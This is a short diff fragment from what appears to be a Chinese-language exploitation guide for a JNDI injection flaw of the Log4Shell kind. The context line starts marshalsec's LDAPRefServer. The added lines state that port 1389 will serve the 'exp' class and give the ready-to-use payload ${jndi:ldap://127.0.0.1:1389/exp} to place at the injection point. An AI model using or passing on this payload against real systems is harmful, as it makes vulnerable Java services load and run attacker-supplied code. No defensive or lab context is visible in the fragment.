@@ -57,3 +57,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefserver "http:/
 ```
 
 注：无.class，有.class将会报错 #为标识元素名
+
+则会服务器会开启1389端口服务，且加载了exp的类
+
+去注入点：`${jndi:ldap://127.0.0.1:1389/exp}`即可利用
